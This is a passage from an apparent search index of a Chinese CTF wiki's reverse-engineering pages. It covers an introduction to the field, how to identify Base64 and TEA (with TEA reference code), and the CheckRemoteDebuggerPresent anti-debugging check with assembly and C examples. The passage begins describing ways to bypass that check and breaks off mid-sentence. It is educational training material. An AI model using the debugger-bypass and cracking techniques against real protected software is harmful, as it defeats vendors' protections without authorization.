https://www.cnblogs.com/rec0rd/p/7646857.html","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"reverse/introduction/","text":"\u5b9a\u4e49 \u00b6 \u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002 \u7814\u7a76\u76ee\u6807 \u00b6 \u5bfc\u51fa\u8f6f\u4ef6\u4ea7\u54c1\u7684\u6e90\u4ee3\u7801\uff0c\u8bbe\u8ba1\u539f\u7406\uff0c\u7ed3\u6784\uff0c\u7b97\u6cd5\uff0c\u5904\u7406\u8fc7\u7a0b\uff0c\u8fd0\u884c\u65b9\u6cd5\u53ca\u76f8\u5173\u6587\u6863\u7b49\u3002 \u5e94\u7528\u9886\u57df \u00b6 \u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002 \u9006\u5411\u5206\u6790\u6d41 \u00b6 \u7814\u7a76\u4fdd\u62a4\u65b9\u6cd5\uff0c\u53bb\u9664\u4fdd\u62a4\u529f\u80fd \u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u8ddf\u8e2a\uff0c\u5206\u6790\u4ee3\u7801\u529f\u80fd \u751f\u6210\u76ee\u6807\u8f6f\u4ef6\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u67b6\u6784\uff0c\u7b97\u6cd5\u7b49\u76f8\u5173\u6587\u6863 \u6ce8\u5165\u4ee3\u7801\uff0c\u5f00\u53d1\u51fa\u66f4\u5b8c\u5584\u7684\u5e94\u7528\u8f6f\u4ef6 \u8f6f\u4ef6\u9006\u5411\u7684\u5386\u53f2 \u00b6 20 \u4e16\u7eaa 60 \u5e74\u4ee3 \u00b6 \u4e3a\u633d\u6551\u7b2c\u4e8c\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u53ca\u52a0\u901f\u7b2c\u4e09\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u5f00\u53d1\uff0c\u7f8e\u56fd\u7814\u5236\u4e13\u7528\u53cd\u7f16\u8bd1\u5de5\u5177\u8fdb\u884c\u8f6f\u4ef6\u79fb\u690d\u3002 1993 \u5e74 \u00b6 Chikofs \u7b49\u4eba\u4e8e\u53d1\u8d77\u9006\u5411\u5de5\u7a0b\u4f1a\u8bae\u5e76\u6bcf\u5e74\u4e3e\u884c\u4e00\u6b21\uff0c\u7814\u7a76\u548c\u8ba8\u8bba\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7684\u95ee\u9898\uff0c\u6280\u672f\u53ca\u5176\u652f\u6301\u5de5\u5177\u3002 80 \u5e74\u4ee3\u540e\u671f\u5230 90 \u5e74\u4ee3 \u00b6 \u5173\u4e8e\u89e3\u51b3\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u548c\u8f6f\u4ef6\u7248\u6743\u7684\u77db\u76fe\u57fa\u672c\u4e0a\u6709\u4e86\u7ed3\u679c\uff0c\u5404\u56fd\u7eb7\u7eb7\u9488\u5bf9\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u8fdb\u884c\u7acb\u6cd5\uff0c\u4e0d\u662f\u7ea6\u675f\u800c\u662f\u89c4\u8303\u8be5\u9886\u57df\u7684\u7814\u7a76\u5de5\u4f5c\u3002 2007 \u5e74 1 \u6708 17 \u65e5 \u00b6 \u6700\u9ad8\u4eba\u6c11\u6cd5\u9662\u53d1\u5e03\u53f8\u6cd5\u89e3\u91ca\uff1a\u901a\u8fc7\u81ea\u884c\u5f00\u53d1\u7814\u5236\u6216\u8005\u53cd\u5411\u5de5\u7a0b\u7b49\u65b9\u5f0f\u83b7\u5f97\u7684\u5546\u4e1a\u79d8\u5bc6\uff0c\u5c06\u4e0d\u88ab\u8ba4\u5b9a\u4e3a\u53cd\u4e0d\u6b63\u5f53\u7ade\u4e89\u6cd5\u6709\u5173\u6761\u6b3e\u89c4\u5b9a\u7684\u4fb5\u72af\u5546\u4e1a\u79d8\u5bc6\u884c\u4e3a\u3002 \u9006\u5411\u7814\u7a76\u7684\u76ee\u7684\u548c\u610f\u4e49 \u00b6 \u5145\u5206\u5229\u7528\u548c\u6539\u9020\u73b0\u6709\u8f6f\u4ef6\uff0c\u5bf9\u73b0\u6709\u8f6f\u4ef6\u8fdb\u884c\u518d\u8bbe\u8ba1\uff0c\u518d\u5de5\u7a0b\uff0c\u4f7f\u8f6f\u4ef6\u529f\u80fd\u5f97\u5230\u5927\u5e45\u63d0\u9ad8\u4ee5\u6ee1\u8db3\u7528\u6237\u7684\u9700\u8981 \u901a\u8fc7\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u5c06\u8fc7\u65f6\u7684\u8f6f\u4ef6\u7cfb\u7edf\u8f6c\u5316\u4e3a\u6613\u6f14\u5316\u7cfb\u7edf \u7834\u9664\u5546\u4e1a\u95ed\u6e90\uff0c\u6280\u672f\u4fdd\u62a4\uff08\u8fd9\u963b\u788d\u4e86\u8f6f\u4ef6\u79d1\u5b66\u7684\u53d1\u5c55\uff09\uff0c\u5f00\u653e\u6e90\u4ee3\u7801 CTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411 \u00b6 \u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 ------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b \u8981\u6c42 \u00b6 \u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6 \u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c \u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406 \u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b","title":"\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7b80\u4ecb"},{"location":"reverse/introduction/#_1","text":"\u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002","title":"\u5b9a\u4e49"},{"location":"reverse/introduction/#_2","text":"\u5bfc\u51fa\u8f6f\u4ef6\u4ea7\u54c1\u7684\u6e90\u4ee3\u7801\uff0c\u8bbe\u8ba1\u539f\u7406\uff0c\u7ed3\u6784\uff0c\u7b97\u6cd5\uff0c\u5904\u7406\u8fc7\u7a0b\uff0c\u8fd0\u884c\u65b9\u6cd5\u53ca\u76f8\u5173\u6587\u6863\u7b49\u3002","title":"\u7814\u7a76\u76ee\u6807"},{"location":"reverse/introduction/#_3","text":"\u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002","title":"\u5e94\u7528\u9886\u57df"},{"location":"reverse/introduction/#_4","text":"\u7814\u7a76\u4fdd\u62a4\u65b9\u6cd5\uff0c\u53bb\u9664\u4fdd\u62a4\u529f\u80fd \u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u8ddf\u8e2a\uff0c\u5206\u6790\u4ee3\u7801\u529f\u80fd \u751f\u6210\u76ee\u6807\u8f6f\u4ef6\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u67b6\u6784\uff0c\u7b97\u6cd5\u7b49\u76f8\u5173\u6587\u6863 \u6ce8\u5165\u4ee3\u7801\uff0c\u5f00\u53d1\u51fa\u66f4\u5b8c\u5584\u7684\u5e94\u7528\u8f6f\u4ef6","title":"\u9006\u5411\u5206\u6790\u6d41"},{"location":"reverse/introduction/#_5","text":"","title":"\u8f6f\u4ef6\u9006\u5411\u7684\u5386\u53f2"},{"location":"reverse/introduction/#20-60","text":"\u4e3a\u633d\u6551\u7b2c\u4e8c\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u53ca\u52a0\u901f\u7b2c\u4e09\u4ee3\u8ba1\u7b97\u673a\u8f6f\u4ef6\u5f00\u53d1\uff0c\u7f8e\u56fd\u7814\u5236\u4e13\u7528\u53cd\u7f16\u8bd1\u5de5\u5177\u8fdb\u884c\u8f6f\u4ef6\u79fb\u690d\u3002","title":"20 \u4e16\u7eaa 60 \u5e74\u4ee3"},{"location":"reverse/introduction/#1993","text":"Chikofs \u7b49\u4eba\u4e8e\u53d1\u8d77\u9006\u5411\u5de5\u7a0b\u4f1a\u8bae\u5e76\u6bcf\u5e74\u4e3e\u884c\u4e00\u6b21\uff0c\u7814\u7a76\u548c\u8ba8\u8bba\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7684\u95ee\u9898\uff0c\u6280\u672f\u53ca\u5176\u652f\u6301\u5de5\u5177\u3002","title":"1993 \u5e74"},{"location":"reverse/introduction/#80-90","text":"\u5173\u4e8e\u89e3\u51b3\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u548c\u8f6f\u4ef6\u7248\u6743\u7684\u77db\u76fe\u57fa\u672c\u4e0a\u6709\u4e86\u7ed3\u679c\uff0c\u5404\u56fd\u7eb7\u7eb7\u9488\u5bf9\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u8fdb\u884c\u7acb\u6cd5\uff0c\u4e0d\u662f\u7ea6\u675f\u800c\u662f\u89c4\u8303\u8be5\u9886\u57df\u7684\u7814\u7a76\u5de5\u4f5c\u3002","title":"80 \u5e74\u4ee3\u540e\u671f\u5230 90 \u5e74\u4ee3"},{"location":"reverse/introduction/#2007-1-17","text":"\u6700\u9ad8\u4eba\u6c11\u6cd5\u9662\u53d1\u5e03\u53f8\u6cd5\u89e3\u91ca\uff1a\u901a\u8fc7\u81ea\u884c\u5f00\u53d1\u7814\u5236\u6216\u8005\u53cd\u5411\u5de5\u7a0b\u7b49\u65b9\u5f0f\u83b7\u5f97\u7684\u5546\u4e1a\u79d8\u5bc6\uff0c\u5c06\u4e0d\u88ab\u8ba4\u5b9a\u4e3a\u53cd\u4e0d\u6b63\u5f53\u7ade\u4e89\u6cd5\u6709\u5173\u6761\u6b3e\u89c4\u5b9a\u7684\u4fb5\u72af\u5546\u4e1a\u79d8\u5bc6\u884c\u4e3a\u3002","title":"2007 \u5e74 1 \u6708 17 \u65e5"},{"location":"reverse/introduction/#_6","text":"\u5145\u5206\u5229\u7528\u548c\u6539\u9020\u73b0\u6709\u8f6f\u4ef6\uff0c\u5bf9\u73b0\u6709\u8f6f\u4ef6\u8fdb\u884c\u518d\u8bbe\u8ba1\uff0c\u518d\u5de5\u7a0b\uff0c\u4f7f\u8f6f\u4ef6\u529f\u80fd\u5f97\u5230\u5927\u5e45\u63d0\u9ad8\u4ee5\u6ee1\u8db3\u7528\u6237\u7684\u9700\u8981 \u901a\u8fc7\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u5c06\u8fc7\u65f6\u7684\u8f6f\u4ef6\u7cfb\u7edf\u8f6c\u5316\u4e3a\u6613\u6f14\u5316\u7cfb\u7edf \u7834\u9664\u5546\u4e1a\u95ed\u6e90\uff0c\u6280\u672f\u4fdd\u62a4\uff08\u8fd9\u963b\u788d\u4e86\u8f6f\u4ef6\u79d1\u5b66\u7684\u53d1\u5c55\uff09\uff0c\u5f00\u653e\u6e90\u4ee3\u7801","title":"\u9006\u5411\u7814\u7a76\u7684\u76ee\u7684\u548c\u610f\u4e49"},{"location":"reverse/introduction/#ctf","text":"\u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 ------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b","title":"CTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411"},{"location":"reverse/introduction/#_7","text":"\u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6 \u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c \u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406 \u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b","title":"\u8981\u6c42"},{"location":"reverse/Identify-Encode-Encryption/introduction/","text":"\u524d\u8a00 \u00b6 \u5728\u5bf9\u6570\u636e\u8fdb\u884c\u53d8\u6362\u7684\u8fc7\u7a0b\u4e2d\uff0c\u9664\u4e86\u7b80\u5355\u7684\u5b57\u8282\u64cd\u4f5c\u4e4b\u5916\uff0c\u8fd8\u4f1a\u4f7f\u7528\u4e00\u4e9b\u5e38\u7528\u7684\u7f16\u7801\u52a0\u5bc6\u7b97\u6cd5\uff0c\u56e0\u6b64\u5982\u679c\u80fd\u591f\u5feb\u901f\u8bc6\u522b\u51fa\u5bf9\u5e94\u7684\u7f16\u7801\u6216\u8005\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c31\u80fd\u66f4\u5feb\u7684\u5206\u6790\u51fa\u6574\u4e2a\u5b8c\u6574\u7684\u7b97\u6cd5\u3002CTF \u9006\u5411\u4e2d\u901a\u5e38\u51fa\u73b0\u7684\u52a0\u5bc6\u7b97\u6cd5\u5305\u62ecbase64\u3001TEA\u3001AES\u3001RC4\u3001MD5\u7b49\u3002 Base64 \u00b6 Base64 \u662f\u4e00\u79cd\u57fa\u4e8e64\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u8868\u793a\u65b9\u6cd5\u3002\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u5c063\u5b57\u8282\u7684\u6570\u636e\uff0c\u5148\u540e\u653e\u5165\u4e00\u4e2a24\u4f4d\u7684\u7f13\u51b2\u533a\u4e2d\uff0c\u5148\u6765\u7684\u5b57\u8282\u5360\u9ad8\u4f4d\u3002\u6570\u636e\u4e0d\u8db33\u5b57\u8282\u7684\u8bdd\uff0c\u4e8e\u7f13\u51b2\u5668\u4e2d\u5269\u4e0b\u7684\u6bd4\u7279\u75280\u8865\u8db3\u3002\u6bcf\u6b21\u53d6\u51fa6\u6bd4\u7279\uff08\u56e0\u4e3a{\\displaystyle 2^{6}=64} \uff09\uff0c\u6309\u7167\u5176\u503c\u9009\u62e9 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ \u4e2d\u7684\u5b57\u7b26\u4f5c\u4e3a\u7f16\u7801\u540e\u7684\u8f93\u51fa\uff0c\u76f4\u5230\u5168\u90e8\u8f93\u5165\u6570\u636e\u8f6c\u6362\u5b8c\u6210\u3002 \u901a\u5e38\u800c\u8a00 Base64 \u7684\u8bc6\u522b\u7279\u5f81\u4e3a\u7d22\u5f15\u8868\uff0c\u5f53\u6211\u4eec\u80fd\u627e\u5230 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ \u8fd9\u6837\u7d22\u5f15\u8868\uff0c\u518d\u7ecf\u8fc7\u7b80\u5355\u7684\u5206\u6790\u57fa\u672c\u5c31\u80fd\u5224\u5b9a\u662f Base64 \u7f16\u7801\u3002 \u5f53\u7136\uff0c\u6709\u4e9b\u9898\u76ee base64 \u7684\u7d22\u5f15\u8868\u662f\u4f1a\u53d8\u7684\uff0c\u4e00\u4e9b\u53d8\u79cd\u7684 base64 \u4e3b\u8981 \u5c31\u662f\u4fee\u6539\u4e86\u8fd9\u4e2a\u7d22\u5f15\u8868\u3002 Tea \u00b6 \u5728 \u5bc6\u7801\u5b66 \u4e2d\uff0c \u5fae\u578b\u52a0\u5bc6\u7b97\u6cd5 \uff08Tiny Encryption Algorithm\uff0cTEA\uff09\u662f\u4e00\u79cd\u6613\u4e8e\u63cf\u8ff0\u548c \u6267\u884c \u7684 \u5757\u5bc6\u7801 \uff0c\u901a\u5e38\u53ea\u9700\u8981\u5f88\u5c11\u7684\u4ee3\u7801\u5c31\u53ef\u5b9e\u73b0\u3002\u5176\u8bbe\u8ba1\u8005\u662f \u5251\u6865\u5927\u5b66\u8ba1\u7b97\u673a\u5b9e\u9a8c\u5ba4 \u7684 \u5927\u536b\u00b7\u60e0\u52d2 \u4e0e \u7f57\u6770\u00b7\u5c3c\u8fbe\u59c6 \u3002 \u53c2\u8003\u4ee3\u7801\uff1a #include <stdint.h> void encrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; /* cache key */ for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ sum += delta ; v0 += (( v1 << 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 >> 5 ) + k1 ); v1 += (( v0 << 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 >> 5 ) + k3 ); } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } void decrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0xC6EF3720 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; /* cache key */ for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ v1 -= (( v0 << 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 >> 5 ) + k3 ); v0 -= (( v1 << 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 >> 5 ) + k1 ); sum -= delta ; } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } \u5728 Tea \u7b97\u6cd5\u4e2d\u5176\u6700\u4e3b\u8981\u7684\u8bc6\u522b\u7279\u5f81\u5c31\u662f \u62e5\u6709\u4e00\u4e2a image number \uff1a0x9e3779b9 \u3002\u5f53\u7136\uff0c\u8fd9 Tea \u7b97\u6cd5\u4e5f\u6709\u9b54\u6539\u7684\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u770b 2018 0ctf Quals milk-tea\u3002","title":"\u5e38\u89c1\u52a0\u5bc6\u7b97\u6cd5\u548c\u7f16\u7801\u8bc6\u522b"},{"location":"reverse/Identify-Encode-Encryption/introduction/#_1","text":"\u5728\u5bf9\u6570\u636e\u8fdb\u884c\u53d8\u6362\u7684\u8fc7\u7a0b\u4e2d\uff0c\u9664\u4e86\u7b80\u5355\u7684\u5b57\u8282\u64cd\u4f5c\u4e4b\u5916\uff0c\u8fd8\u4f1a\u4f7f\u7528\u4e00\u4e9b\u5e38\u7528\u7684\u7f16\u7801\u52a0\u5bc6\u7b97\u6cd5\uff0c\u56e0\u6b64\u5982\u679c\u80fd\u591f\u5feb\u901f\u8bc6\u522b\u51fa\u5bf9\u5e94\u7684\u7f16\u7801\u6216\u8005\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c31\u80fd\u66f4\u5feb\u7684\u5206\u6790\u51fa\u6574\u4e2a\u5b8c\u6574\u7684\u7b97\u6cd5\u3002CTF \u9006\u5411\u4e2d\u901a\u5e38\u51fa\u73b0\u7684\u52a0\u5bc6\u7b97\u6cd5\u5305\u62ecbase64\u3001TEA\u3001AES\u3001RC4\u3001MD5\u7b49\u3002","title":"\u524d\u8a00"},{"location":"reverse/Identify-Encode-Encryption/introduction/#base64","text":"Base64 \u662f\u4e00\u79cd\u57fa\u4e8e64\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u8868\u793a\u65b9\u6cd5\u3002\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u5c063\u5b57\u8282\u7684\u6570\u636e\uff0c\u5148\u540e\u653e\u5165\u4e00\u4e2a24\u4f4d\u7684\u7f13\u51b2\u533a\u4e2d\uff0c\u5148\u6765\u7684\u5b57\u8282\u5360\u9ad8\u4f4d\u3002\u6570\u636e\u4e0d\u8db33\u5b57\u8282\u7684\u8bdd\uff0c\u4e8e\u7f13\u51b2\u5668\u4e2d\u5269\u4e0b\u7684\u6bd4\u7279\u75280\u8865\u8db3\u3002\u6bcf\u6b21\u53d6\u51fa6\u6bd4\u7279\uff08\u56e0\u4e3a{\\displaystyle 2^{6}=64} \uff09\uff0c\u6309\u7167\u5176\u503c\u9009\u62e9 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ \u4e2d\u7684\u5b57\u7b26\u4f5c\u4e3a\u7f16\u7801\u540e\u7684\u8f93\u51fa\uff0c\u76f4\u5230\u5168\u90e8\u8f93\u5165\u6570\u636e\u8f6c\u6362\u5b8c\u6210\u3002 \u901a\u5e38\u800c\u8a00 Base64 \u7684\u8bc6\u522b\u7279\u5f81\u4e3a\u7d22\u5f15\u8868\uff0c\u5f53\u6211\u4eec\u80fd\u627e\u5230 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ \u8fd9\u6837\u7d22\u5f15\u8868\uff0c\u518d\u7ecf\u8fc7\u7b80\u5355\u7684\u5206\u6790\u57fa\u672c\u5c31\u80fd\u5224\u5b9a\u662f Base64 \u7f16\u7801\u3002 \u5f53\u7136\uff0c\u6709\u4e9b\u9898\u76ee base64 \u7684\u7d22\u5f15\u8868\u662f\u4f1a\u53d8\u7684\uff0c\u4e00\u4e9b\u53d8\u79cd\u7684 base64 \u4e3b\u8981 \u5c31\u662f\u4fee\u6539\u4e86\u8fd9\u4e2a\u7d22\u5f15\u8868\u3002","title":"Base64"},{"location":"reverse/Identify-Encode-Encryption/introduction/#tea","text":"\u5728 \u5bc6\u7801\u5b66 \u4e2d\uff0c \u5fae\u578b\u52a0\u5bc6\u7b97\u6cd5 \uff08Tiny Encryption Algorithm\uff0cTEA\uff09\u662f\u4e00\u79cd\u6613\u4e8e\u63cf\u8ff0\u548c \u6267\u884c \u7684 \u5757\u5bc6\u7801 \uff0c\u901a\u5e38\u53ea\u9700\u8981\u5f88\u5c11\u7684\u4ee3\u7801\u5c31\u53ef\u5b9e\u73b0\u3002\u5176\u8bbe\u8ba1\u8005\u662f \u5251\u6865\u5927\u5b66\u8ba1\u7b97\u673a\u5b9e\u9a8c\u5ba4 \u7684 \u5927\u536b\u00b7\u60e0\u52d2 \u4e0e \u7f57\u6770\u00b7\u5c3c\u8fbe\u59c6 \u3002 \u53c2\u8003\u4ee3\u7801\uff1a #include <stdint.h> void encrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; /* cache key */ for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ sum += delta ; v0 += (( v1 << 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 >> 5 ) + k1 ); v1 += (( v0 << 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 >> 5 ) + k3 ); } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } void decrypt ( uint32_t * v , uint32_t * k ) { uint32_t v0 = v [ 0 ], v1 = v [ 1 ], sum = 0xC6EF3720 , i ; /* set up */ uint32_t delta = 0x9e3779b9 ; /* a key schedule constant */ uint32_t k0 = k [ 0 ], k1 = k [ 1 ], k2 = k [ 2 ], k3 = k [ 3 ]; /* cache key */ for ( i = 0 ; i < 32 ; i ++ ) { /* basic cycle start */ v1 -= (( v0 << 4 ) + k2 ) ^ ( v0 + sum ) ^ (( v0 >> 5 ) + k3 ); v0 -= (( v1 << 4 ) + k0 ) ^ ( v1 + sum ) ^ (( v1 >> 5 ) + k1 ); sum -= delta ; } /* end cycle */ v [ 0 ] = v0 ; v [ 1 ] = v1 ; } \u5728 Tea \u7b97\u6cd5\u4e2d\u5176\u6700\u4e3b\u8981\u7684\u8bc6\u522b\u7279\u5f81\u5c31\u662f \u62e5\u6709\u4e00\u4e2a image number \uff1a0x9e3779b9 \u3002\u5f53\u7136\uff0c\u8fd9 Tea \u7b97\u6cd5\u4e5f\u6709\u9b54\u6539\u7684\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u770b 2018 0ctf Quals milk-tea\u3002","title":"Tea"},{"location":"reverse/anti-debug/checkremotedebuggerpresent/","text":"\u5173\u4e8eCheckRemoteDebuggerPresent \u00b6 kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u6307\u5b9a\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5. Remote \u5728\u5355\u8bcd\u91cc\u662f\u6307\u540c\u4e00\u4e2a\u673a\u5668\u4e2d\u7684\u4e0d\u540c\u8fdb\u7a0b. BOOL WINAPI CheckRemoteDebuggerPresent ( _In_ HANDLE hProcess , _Inout_ PBOOL pbDebuggerPresent ); \u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728(\u901a\u5e38\u662f\u68c0\u6d4b\u81ea\u5df1\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5), \u8be5\u51fd\u6570\u4f1a\u5c06 pbDebuggerPresent \u6307\u5411\u7684\u503c\u8bbe\u4e3a 0xffffffff . \u68c0\u6d4b\u4ee3\u7801 \u00b6 \u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4d\u73af\u5883 push eax push esp push - 1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent pop eax test eax , eax jne being_debugged \u621664\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 enter 20 h , 0 mov edx , ebp or rcx , - 1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent leave test ebp , ebp jne being_debugged \u5982\u4f55\u7ed5\u8fc7 \u00b6 \u6bd4\u5982\u6709\u5982\u4e0b\u7684\u4ee3\u7801 int main ( int argc , char * argv []) { BOOL isDebuggerPresent = FALSE ; if ( CheckRemoteDebuggerPresent ( GetCurrentProcess (), & isDebuggerPresent )) { if ( isDebuggerPresent ) { std :: cout << \"Stop debugging program!\" << std :: endl ; exit ( - 1 ); } } return 0 ; } \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 isDebuggerPresent \u7684\u503c\u6216\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u6765\u7ed5\u8fc7(\u6ce8\u610f\u4e0d\u662f CheckRemoteDebuggerPresent \u7684izhi, \u5b83\u7684\u8fd4\u56de\u503c\u662f\u7528\u4e8e\u8868\u793a\u51fd\u6570\u662f\u5426\u6b63\u786e\u6267\u884c). \u4f46\u5982\u679c\u8981\u9488\u5bf9 CheckRemoteDebuggerPresent \u8fd9\u4e2aapi\u51fd\u6570\u8fdb\u884c\u4fee\u6539\u7684\u8bdd. \u9996\u5148\u8981\u77e5\u9053 CheckRemoteDebuggerPresent \u5185\u90e8\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess \u6765\u5b8c\u6210\u529f\u80fd\u7684. \u800c\u6211\u4eec\u5c31\u9700\u8981\u5bf9 NtQueryInformationProcess 